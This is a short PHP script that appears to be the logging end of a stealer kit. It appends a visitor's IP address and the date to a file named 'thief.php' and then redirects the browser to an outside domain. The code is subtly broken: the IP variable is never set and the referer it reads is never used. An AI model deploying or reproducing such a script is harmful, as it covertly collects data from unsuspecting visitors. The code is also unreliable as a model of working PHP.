<?php
  $date = date("j F, Y, g:i a");;
  $referer = getenv('HTTP_REFERER');
  $fp = fopen('thief.php', 'a');
  fwrite($fp, 'IP: '.$ip. '<br/ > Date and time: '.$date);
  fclose($fp);
  header ("Location: sewa108.tk");
?>